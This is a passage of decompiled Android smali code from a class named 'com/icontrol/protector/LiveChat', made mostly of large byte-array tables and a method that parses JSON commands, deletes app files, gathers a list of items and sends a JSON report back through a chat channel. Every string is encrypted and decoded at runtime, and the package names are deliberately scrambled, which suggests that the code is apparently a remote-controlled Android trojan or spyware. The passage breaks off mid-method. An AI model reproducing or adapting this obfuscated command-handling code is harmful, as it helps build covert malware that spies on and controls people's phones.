        0x76t
        0x47t
        0x4at
        0x41t
        0x48t
        -0x33t
        0x66t
    .end array-data

    :array_12
    .array-data 1
        -0x61t
        -0x10t
        0x1et
    .end array-data

    :array_13
    .array-data 1
        -0x18t
        -0x7et
        0x75t
        -0x8t
        -0x30t
        0x2at
        -0x7ct
        0x4bt
    .end array-data

    :array_14
    .array-data 1
        0x70t
        -0x1bt
        -0x61t
    .end array-data

    :array_15
    .array-data 1
        0x3t
        -0x69t
        -0x9t
        -0x25t
        0x7at
        0x6t
        0x21t
        -0x37t
    .end array-data

    :array_16
    .array-data 1
        0x2et
        0x28t
        -0xdt
    .end array-data

    :array_17
    .array-data 1
        0x43t
        0x41t
        -0x70t
        -0x4et
        -0x48t
        -0x53t
        -0x2et
        0x5ct
    .end array-data

    :array_18
    .array-data 1
        -0x4bt
        0x64t
        0x1et
    .end array-data

    :array_19
    .array-data 1
        -0x2ct
        0x0t
        0x7at
        -0x3t
        -0xdt
        -0x2dt
        -0x13t
        -0x75t
    .end array-data

    :array_1a
    .array-data 1
        -0x16t
        0x69t
    .end array-data

    nop

    :array_1b
    .array-data 1
        -0x78t
        0xat
        -0x44t
        -0x1ct
        0x71t
        0x18t
        -0x10t
        -0x4t
    .end array-data

    :array_1c
    .array-data 1
        0x3dt
        0x9t
        -0x4ct
        -0x5ft
        -0x66t
        0x78t
    .end array-data

    nop

    :array_1d
    .array-data 1
        0x48t
        0x79t
        -0x28t
        -0x32t
        -0x5t
        0x1ct
        0x39t
        -0x64t
    .end array-data

    :array_1e
    .array-data 1
        0x4t
        -0x1bt
        0x53t
        -0x4ct
        -0x25t
        -0x62t
    .end array-data

    nop

    :array_1f
    .array-data 1
        0x77t
        -0x7at
        0x21t
        -0x2ft
        -0x42t
        -0x10t
        0x22t
        -0x29t
    .end array-data

    :array_20
    .array-data 1
        -0x1t
        -0x66t
        -0x44t
        0x79t
        -0x38t
        0x44t
    .end array-data

    nop

    :array_21
    .array-data 1
        -0x74t
        -0x7t
        -0x32t
        0x1ct
        -0x57t
        0x20t
        -0x13t
        0x8t
    .end array-data

    :array_22
    .array-data 1
        -0x33t
        0x42t
        0x29t
        -0x5dt
    .end array-data

    :array_23
    .array-data 1
        -0x42t
        0x2bt
        0x4dt
        -0x3bt
        0x18t
        -0x5ct
        -0x32t
        0x7bt
    .end array-data

    :array_24
    .array-data 1
        0x27t
        -0x7bt
        0x15t
        -0x7ct
    .end array-data

    :array_25
    .array-data 1
        0x49t
        -0x10t
        0x79t
        -0x18t
        0x40t
        -0x3at
        0x5t
        -0x35t
    .end array-data

    :array_26
    .array-data 1
        -0x63t
        0x41t
        0x27t
        0x56t
    .end array-data

    :array_27
    .array-data 1
        -0xdt
        0x34t
        0x4bt
        0x3at
        -0x50t
        0x41t
        -0x2ft
        0x5ft
    .end array-data

    :array_28
    .array-data 1
        -0x2bt
        0x43t
    .end array-data

    nop

    :array_29
    .array-data 1
        -0x46t
        0x33t
        0x32t
        -0x1at
        -0x2et
        -0x36t
        -0x18t
        0x6dt
    .end array-data

    :array_2a
    .array-data 1
        0xdt
        -0x20t
        -0x64t
        0x1ft
    .end array-data

    :array_2b
    .array-data 1
        0x63t
        -0x6bt
        -0x10t
        0x73t
        0x59t
        0x56t
        -0x63t
        -0x4at
    .end array-data

    :array_2c
    .array-data 1
        -0x75t
        0x24t
        -0x69t
        0x32t
        -0xbt
        0x4t
        -0x16t
        -0x5at
        -0x3et
        0x3et
        -0x6dt
        0x2et
        -0x7t
        0x19t
        -0x9t
        -0xbt
        -0x3dt
        0x6bt
    .end array-data

    nop

    :array_2d
    .array-data 1
        -0x16t
        0x51t
        -0x1dt
        0x5at
        -0x70t
        0x76t
        -0x67t
        -0x7at
    .end array-data

    :array_2e
    .array-data 1
        -0x33t
        0x4et
        0x13t
        0x58t
    .end array-data

    :array_2f
    .array-data 1
        -0x5dt
        0x3bt
        0x7ft
        0x34t
        -0x2dt
        0xat
        0x75t
        -0x44t
    .end array-data

    :array_30
    .array-data 1
        0x21t
        0x4bt
        -0x29t
        -0x3dt
        -0x21t
        -0x53t
        0x49t
        0x1bt
        0x5t
        0x47t
        -0x40t
        -0x1bt
        -0x13t
    .end array-data

    nop

    :array_31
    .array-data 1
        0x73t
        0x2et
        -0x4ct
        -0x64t
        -0x62t
        -0x32t
        0x3dt
        0x72t
    .end array-data

    :array_32
    .array-data 1
        -0x67t
        0xet
        -0x4dt
        0x5bt
        -0x1bt
        -0x3bt
        0x38t
        0xft
        -0x43t
        0x1et
    .end array-data

    nop

    :array_33
    .array-data 1
        -0x28t
        0x6dt
        -0x39t
        0x32t
        -0x6dt
        -0x54t
        0x4ct
        0x66t
    .end array-data

    :array_34
    .array-data 1
        0x41t
        -0x42t
        0x2et
        -0x48t
        0x5et
        -0x7dt
        0x7at
        0x48t
    .end array-data

    :array_35
    .array-data 1
        -0x74t
        -0x2ct
        0x6at
        -0x28t
        -0x1dt
        0x24t
        -0x2et
        0x43t
        -0x56t
        -0x3dt
        0x66t
        -0x14t
        -0x13t
        0x32t
    .end array-data

    nop

    :array_36
    .array-data 1
        -0x22t
        -0x4ft
        0x9t
        -0x79t
        -0x78t
        0x41t
        -0x55t
        0x30t
    .end array-data

    :array_37
    .array-data 1
        -0x44t
        -0x2dt
        -0x80t
        0x32t
        -0x5ct
        0xdt
        -0x4ct
        0x2ct
        -0x4et
        -0x3bt
    .end array-data

    nop

    :array_38
    .array-data 1
        -0x29t
        -0x4at
        -0x7t
        0x41t
        -0x30t
        0x7ft
        -0x25t
        0x47t
    .end array-data

    :array_39
    .array-data 1
        0x6et
        0x3dt
        -0x3ct
        -0x8t
        0x68t
        0x7bt
        -0x3t
        -0x1at
    .end array-data

    :array_3a
    .array-data 1
        -0x30t
        -0x3ft
        0x54t
        -0x48t
        0x5ft
        0x17t
        0x2et
        -0x16t
        -0x1ct
        -0x33t
        0x54t
        -0x7at
        0x65t
        0x11t
        0x35t
        -0x13t
        -0xft
    .end array-data

    nop

    :array_3b
    .array-data 1
        -0x7et
        -0x5ct
        0x37t
        -0x19t
        0x11t
        0x78t
        0x5at
        -0x7dt
    .end array-data

    :array_3c
    .array-data 1
        -0x57t
        0x53t
        0x69t
        0x36t
        -0x5et
        0x4dt
        0x7dt
        0x62t
        -0x4dt
        0x55t
        0x72t
        0x31t
        -0x49t
    .end array-data

    nop

    :array_3d
    .array-data 1
        -0x39t
        0x3ct
        0x1dt
        0x5ft
        -0x3ct
        0x24t
        0x1et
        0x3t
    .end array-data

    :array_3e
    .array-data 1
        0x2ct
        0x47t
        0x37t
        -0x30t
        -0x3bt
        -0x21t
        -0x40t
        -0x53t
    .end array-data

    :array_3f
    .array-data 1
        0x24t
        0x2dt
        -0x21t
        0x53t
        0x72t
        0x5t
        0x35t
        -0x10t
    .end array-data

    :array_40
    .array-data 1
        0x76t
        0x48t
        -0x44t
        0xct
        0x13t
        0x75t
        0x45t
        -0x7dt
    .end array-data

    :array_41
    .array-data 1
        0x3ft
        -0x2t
        0x74t
        0x4ft
        -0x52t
        -0x42t
        -0x7t
        -0x68t
        0x39t
        -0x19t
        0x74t
    .end array-data

    :array_42
    .array-data 1
        0x49t
        -0x69t
        0x7t
        0x26t
        -0x26t
        -0x25t
        -0x63t
        -0x7t
    .end array-data

    :array_43
    .array-data 1
        0x7ct
        -0xbt
        0x5dt
        -0x18t
        -0x78t
        0x4dt
        -0x30t
        -0x55t
    .end array-data

    :array_44
    .array-data 1
        -0x16t
        -0x4ft
        -0x38t
        -0x5at
        -0x76t
        0x22t
        0x61t
        0x39t
        -0x35t
    .end array-data

    nop

    :array_45
    .array-data 1
        -0x48t
        -0x2ct
        -0x55t
        -0x7t
        -0x1at
        0x4bt
        0xft
        0x52t
    .end array-data

    :array_46
    .array-data 1
        -0x20t
        -0x2bt
        0x10t
        -0x30t
        0x7ft
        0x4dt
        -0x1et
        0x4t
        -0x1t
        -0x2et
        0x8t
        -0x36t
    .end array-data

    :array_47
    .array-data 1
        -0x6at
        -0x44t
        0x63t
        -0x47t
        0xbt
        0x28t
        -0x7at
        0x68t
    .end array-data

    :array_48
    .array-data 1
        -0x4dt
        -0x6bt
        0x3at
        0x3dt
        -0x3et
        -0x4ct
        0x56t
        0x5et
    .end array-data

    :array_49
    .array-data 1
        0x4t
        -0x1bt
        -0x56t
        -0x10t
        -0x4dt
        -0x5at
        0x3ct
    .end array-data

    :array_4a
    .array-data 1
        0x48t
        -0x74t
        -0x24t
        -0x51t
        -0x40t
        -0x3bt
        0x4et
        0x48t
    .end array-data

    :array_4b
    .array-data 1
        0x2at
        0xct
        0x50t
        0x71t
        0x58t
        -0x76t
        0x66t
        -0x69t
        0x23t
        0xbt
    .end array-data

    nop

    :array_4c
    .array-data 1
        0x46t
        0x65t
        0x26t
        0x14t
        0x2bt
        -0x17t
        0x14t
        -0xet
    .end array-data

    :array_4d
    .array-data 1
        -0x71t
        -0x6bt
        -0x30t
        0x5et
        0x2et
        0x3ft
        0x7bt
        0x47t
    .end array-data

    :array_4e
    .array-data 1
        -0x27t
        0x78t
        0x41t
        -0x59t
        -0x6dt
        -0x15t
        -0x34t
    .end array-data

    :array_4f
    .array-data 1
        -0x6bt
        0x11t
        0x37t
        -0x8t
        -0x20t
        -0x78t
        -0x42t
        -0x7et
    .end array-data

    :array_50
    .array-data 1
        0x14t
        -0x1t
        0x60t
        -0x38t
        0x34t
        0x14t
    .end array-data

    nop

    :array_51
    .array-data 1
        0x78t
        -0x6at
        0x16t
        -0x45t
        0x57t
        0x66t
        -0x38t
        0x25t
    .end array-data

    :array_52
    .array-data 1
        0x2et
        0xdt
        0x29t
        -0x70t
        0x17t
        -0x18t
        -0x47t
        -0x28t
        0x11t
        0x15t
        0x32t
        -0x69t
        0x1dt
    .end array-data

    nop

    :array_53
    .array-data 1
        0x61t
        0x7dt
        0x5dt
        -0x7t
        0x78t
        -0x7at
        -0x36t
        -0x8t
    .end array-data

    :array_54
    .array-data 1
        -0x62t
        0x58t
        -0xat
        0x69t
    .end array-data

    :array_55
    .array-data 1
        -0x3t
        0x35t
        -0x68t
        0xdt
        0x70t
        0x74t
        -0x50t
        0x36t
    .end array-data

    :array_56
    .array-data 1
        -0x47t
        -0x5et
        0x60t
        0x3at
        0x49t
        -0x27t
        0x53t
        -0x3et
    .end array-data

    :array_57
    .array-data 1
        -0x29t
        0x2t
        -0x76t
        0x76t
        -0x48t
        -0x4et
        -0x7dt
        0x5at
        -0x38t
        0x18t
        -0x70t
        0x54t
        -0x12t
        -0x48t
        -0x72t
        0x7ft
        -0x2dt
        0xet
    .end array-data

    nop

    :array_58
    .array-data 1
        -0x59t
        0x6bt
        -0x1ct
        0x11t
        -0x6at
        -0x23t
        -0x13t
        0xat
    .end array-data

    :array_59
    .array-data 1
        0x29t
        -0x3dt
        0x6t
        -0x73t
        0x3at
        0x1ct
        0x1t
        0x13t
        0x12t
        -0x2ft
        0x9t
        -0x72t
        0x33t
    .end array-data

    nop

    :array_5a
    .array-data 1
        0x61t
        -0x5et
        0x68t
        -0x17t
        0x56t
        0x79t
        0x6ct
        0x76t
    .end array-data
.end method

.method private r(Lorg/json/JSONObject;)V
    .locals 9

    .line 1
    const/16 v0, 0xa

    const/4 v1, 0x3

    const/16 v2, 0x8

    :try_start_0
    new-array v3, v1, [B

    fill-array-data v3, :array_0

    new-array v4, v2, [B

    fill-array-data v4, :array_1

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    invoke-virtual {p1, v3, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    new-instance v4, Lntidisestablish/neumonoul/floccinaucinih/s3;

    iget-object v5, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-direct {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/s3;-><init>(Landroid/content/Context;)V

    const/4 v5, 0x1

    new-array v6, v5, [B

    const/16 v7, -0x3a

    const/4 v8, 0x0

    aput-byte v7, v6, v8

    new-array v7, v2, [B

    fill-array-data v7, :array_2

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    const/16 v7, 0x9

    if-eqz v6, :cond_2

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    new-array v3, v2, [B

    fill-array-data v3, :array_4

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v3, v5, [B

    const/16 v5, -0x50

    aput-byte v5, v3, v8

    new-array v5, v2, [B

    fill-array-data v5, :array_5

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v1, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    new-instance v1, Ljava/io/File;

    iget-object v3, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-virtual {v3}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v3

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    new-array v6, v0, [B

    fill-array-data v6, :array_6

    new-array v8, v2, [B

    fill-array-data v8, :array_7

    invoke-static {v6, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v1, v3, v5}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v3

    if-eqz v3, :cond_0

    invoke-virtual {v1}, Ljava/io/File;->delete()Z

    iget-object v1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    new-array v3, v7, [B

    fill-array-data v3, :array_8

    new-array v5, v2, [B

    fill-array-data v5, :array_9

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/16 v5, 0x13

    new-array v5, v5, [B

    fill-array-data v5, :array_a

    new-array v6, v2, [B

    fill-array-data v6, :array_b

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v1, v3, v5}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    :catch_0
    move-exception p1

    goto/16 :goto_4

    :cond_0
    :goto_0
    sget-object v1, Lcom/icontrol/protector/a;->d:Ljava/util/ArrayList;

    invoke-virtual {v1, p1}, Ljava/util/ArrayList;->contains(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    sget-object v1, Lcom/icontrol/protector/a;->d:Ljava/util/ArrayList;

    invoke-virtual {v1, p1}, Ljava/util/ArrayList;->remove(Ljava/lang/Object;)Z

    iget-object v1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    new-array v3, v7, [B

    fill-array-data v3, :array_c

    new-array v5, v2, [B

    fill-array-data v5, :array_d

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    new-array v6, v2, [B

    fill-array-data v6, :array_e

    new-array v7, v2, [B

    fill-array-data v7, :array_f

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v1, v3, v5}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_1
    invoke-virtual {v4, p1}, Lntidisestablish/neumonoul/floccinaucinih/s3;->b(Ljava/lang/String;)V

    goto/16 :goto_5

    :cond_2
    new-array p1, v5, [B

    const/16 v1, -0xf

    aput-byte v1, p1, v8

    new-array v1, v2, [B

    fill-array-data v1, :array_10

    invoke-static {p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_6

    sget-object p1, Lcom/icontrol/protector/a;->d:Ljava/util/ArrayList;

    invoke-virtual {p1}, Ljava/util/ArrayList;->size()I

    move-result p1

    if-nez p1, :cond_3

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    new-array v1, v7, [B

    fill-array-data v1, :array_11

    new-array v3, v2, [B

    fill-array-data v3, :array_12

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v3, 0x11

    new-array v3, v3, [B

    fill-array-data v3, :array_13

    new-array v4, v2, [B

    fill-array-data v4, :array_14

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {p1, v1, v3}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_3
    new-instance p1, Lorg/json/JSONArray;

    invoke-direct {p1}, Lorg/json/JSONArray;-><init>()V

    sget-object v1, Lcom/icontrol/protector/a;->d:Ljava/util/ArrayList;

    invoke-virtual {v1}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_1
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    const/4 v5, 0x5

    const/4 v6, 0x4

    if-eqz v3, :cond_5

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    new-instance v7, Lorg/json/JSONObject;

    invoke-direct {v7}, Lorg/json/JSONObject;-><init>()V

    new-array v5, v5, [B

    fill-array-data v5, :array_15

    new-array v8, v2, [B

    fill-array-data v8, :array_16

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v4, v3}, Lntidisestablish/neumonoul/floccinaucinih/s3;->c(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/List;->isEmpty()Z

    move-result v5

    if-eqz v5, :cond_4

    new-array v3, v6, [B

    fill-array-data v3, :array_17

    new-array v5, v2, [B

    fill-array-data v5, :array_18

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v5, 0x7

    new-array v5, v5, [B

    fill-array-data v5, :array_19

    new-array v6, v2, [B

    fill-array-data v6, :array_1a

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    :goto_2
    invoke-virtual {v7, v3, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto :goto_3

    :cond_4
    new-instance v5, Lorg/json/JSONArray;

    invoke-direct {v5, v3}, Lorg/json/JSONArray;-><init>(Ljava/util/Collection;)V

    new-array v3, v6, [B

    fill-array-data v3, :array_1b

    new-array v6, v2, [B

    fill-array-data v6, :array_1c

    invoke-static {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    goto :goto_2

    :goto_3
    invoke-virtual {p1, v7}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :cond_5
    :try_start_1
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    new-array v3, v6, [B

    fill-array-data v3, :array_1d

    new-array v4, v2, [B

    fill-array-data v4, :array_1e

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    new-array v4, v6, [B

    fill-array-data v4, :array_1f

    new-array v6, v2, [B

    fill-array-data v6, :array_20

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v3, v5, [B

    fill-array-data v3, :array_21

    new-array v4, v2, [B

    fill-array-data v4, :array_22

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    iget-object v1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {v1, p1}, Lcom/icontrol/protector/LiveChat;->g(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_5

    :catch_1
    move-exception p1

    :try_start_2
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    goto :goto_5

    :cond_6
    new-array p1, v5, [B

    const/16 v1, -0x17

    aput-byte v1, p1, v8

    new-array v1, v2, [B

    fill-array-data v1, :array_23

    invoke-static {p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_5

    :goto_4
    new-array v0, v0, [B

    fill-array-data v0, :array_24

    new-array v1, v2, [B

    fill-array-data v1, :array_25

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :goto_5
    return-void

    nop

    :array_0
    .array-data 1
        0x7et
        -0x4et
        -0x4ct
    .end array-data

    :array_1
    .array-data 1
        0x1dt
        -0x2dt
        -0x39t
        0x3at
        0x21t
        -0x33t
        0x2ct
        0x79t
    .end array-data

    :array_2
    .array-data 1
        -0xat
        0x5t
        0x6ct
        -0x1ct
        0x13t
        0x6dt
        0x3at
        0x28t
    .end array-data

    :array_3
    .array-data 1
        -0x43t
        0x2ct
        -0x7ft
    .end array-data

    :array_4
    .array-data 1
        -0x37t
        0x45t
        -0x1bt
        -0x34t
        -0x49t
        0x4bt
        -0x10t
        -0x20t
    .end array-data

    :array_5
    .array-data 1
        -0x80t
        -0x5bt
        -0x6at
        -0x61t
        0x53t
        0x2bt
        -0x2dt
        -0x16t
    .end array-data

    :array_6
    .array-data 1
        -0x49t
        -0x30t
        0x72t
        -0x62t
        0xft
        0x45t
        0x5at
        0x5ct
        -0x5dt
        -0x73t
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x39t
        -0x5et
        0x1dt
        -0x16t
        0x6at
        0x26t
        0x2et
        0x39t
    .end array-data

    :array_8
    .array-data 1
        0x70t
        0x25t
        -0x1dt
        0x71t
        -0x37t
        0x1et
        -0x8t
        0x28t
        0x77t
    .end array-data

    nop

    :array_9
    .array-data 1
        0x19t
        0x4bt
        -0x77t
        0x14t
        -0x56t
        0x6at
        -0x6ft
        0x47t
    .end array-data

    :array_a
    .array-data 1
        0x59t
        -0x72t
        -0x58t
        -0x3et
        -0x22t
        0x2dt
        0x3ft
        0x64t
        0x62t
        -0x7bt
        -0x51t
        -0x38t
        -0x35t
        0x3ct
        0x7bt
        0x20t
        0x6at
        -0x61t
        -0x5ct
    .end array-data

    :array_b
    .array-data 1
        0xbt
        -0x15t
        -0x3bt
        -0x53t
        -0x58t
        0x48t
        0x5bt
        0x44t
    .end array-data

    :array_c
    .array-data 1
        -0x3bt
        0x9t
        0x29t
        -0x2dt
        -0x22t
        0x53t
        0x21t
        0x66t
        -0x3et
    .end array-data

    nop

    :array_d
    .array-data 1
        -0x54t
        0x67t
        0x43t
        -0x4at
        -0x43t
        0x27t
        0x48t
        0x9t
    .end array-data

    :array_e
    .array-data 1
        0x3t
        0x45t
        0x70t
        0x35t
        0x4dt
        -0x12t
        0x13t
        -0x15t
    .end array-data

    :array_f
    .array-data 1
        0x51t
        0x20t
        0x1dt
        0x5at
        0x3bt
        -0x75t
        0x77t
        -0x35t
    .end array-data

    :array_10
    .array-data 1
        -0x40t
        0xdt
        0x14t
        -0x29t
        -0x7t
        0x0t
        0x77t
        0x59t
    .end array-data

    :array_11
    .array-data 1
        -0x6dt
        0x73t
        -0x1at
        -0x66t
        -0x41t
        -0x3dt
        0x4ct
        -0x77t
        -0x6ct
    .end array-data

    nop

    :array_12
    .array-data 1
        -0x6t
        0x1dt
        -0x74t
        -0x1t
        -0x24t
        -0x49t
        0x25t
        -0x1at
    .end array-data

    :array_13
    .array-data 1
        -0x4ft
        -0x1at
        -0x3bt
        -0x3et
        0xft
        -0x39t
        0x2ft
        0x61t
        -0x55t
        -0x20t
        -0x76t
        -0x3bt
        0x12t
        -0x73t
        0x2bt
        0x66t
        -0x45t
    .end array-data

    nop

    :array_14
    .array-data 1
        -0x21t
        -0x77t
        -0x1bt
        -0x55t
        0x61t
        -0x53t
        0x4at
        0x2t
    .end array-data

    :array_15
    .array-data 1
        0x7t
        -0x28t
        0x73t
        0x50t
        -0x72t
    .end array-data

    nop

    :array_16
    .array-data 1
        0x66t
        -0x58t
        0x3t
        0x19t
        -0x16t
        -0x4et
        -0xbt
        0x76t
    .end array-data

    :array_17
    .array-data 1
        -0x61t
        -0x10t
        -0x26t
        0x40t
    .end array-data

    :array_18
    .array-data 1
        -0x5t
        -0x6ft
        -0x52t
        0x21t
        -0x4et
        0x59t
        -0x1dt
        -0x49t
    .end array-data

    :array_19
    .array-data 1
        0x41t
        0x34t
        0x54t
        -0x1ct
        -0x19t
        0x55t
        -0x1dt
    .end array-data

    :array_1a
    .array-data 1
        0xft
        0x5bt
        0x74t
        -0x80t
        -0x7at
        0x21t
        -0x7et
        0x25t
    .end array-data

    :array_1b
    .array-data 1
        0x17t
        -0x29t
        -0x39t
        -0x62t
    .end array-data

    :array_1c
    .array-data 1
        0x73t
        -0x4at
        -0x4dt
        -0x1t
        -0x3dt
        0x36t
        -0x41t
        0x2at
    .end array-data

    :array_1d
    .array-data 1
        -0x42t
        0x5at
        0x19t
        -0x31t
    .end array-data

    :array_1e
    .array-data 1
        -0x36t
        0x23t
        0x69t
        -0x56t
        -0x64t
        0x2t
        -0x7ct
        -0x45t
    .end array-data

    :array_1f
    .array-data 1
        0x73t
        0xft
        -0x1t
        0x43t
    .end array-data

    :array_20
    .array-data 1
        0x19t
        0x6at
        -0x64t
        0x37t
        -0x55t
        -0x4ft
        -0x79t
        0x58t
    .end array-data

    :array_21
    .array-data 1
        0x4bt
        -0x28t
        -0x45t
        0x65t
        -0x1bt
    .end array-data

    nop

    :array_22
    .array-data 1
        0x21t
        -0x44t
        -0x26t
        0x11t
        -0x7ct
        0x6at
        0x23t
        0x42t
    .end array-data

    :array_23
    .array-data 1
        -0x25t
        0x56t
        -0x2et
        -0x4t
        0x6ct
        0x2dt
        0x6ct
        -0x15t
    .end array-data

    :array_24
    .array-data 1
        -0x48t
        -0x6at
        0x36t
        0x1ft
        0x37t
        -0x12t
        0x3bt
        0x73t
        -0x6dt
        -0x7dt
    .end array-data

    nop

    :array_25
    .array-data 1
        -0x10t
        -0x9t
        0x58t
        0x7bt
        0x5bt
        -0x75t
        0x51t
        0x16t
    .end array-data
.end method

.method private s(Lorg/json/JSONObject;)V
    .locals 8

    .line 1
    const-string v0, ""

    const/4 v1, 0x3

    const/16 v2, 0x8

    :try_start_0
    new-array v3, v1, [B

    fill-array-data v3, :array_0

    new-array v4, v2, [B

    fill-array-data v4, :array_1

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v3, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x1

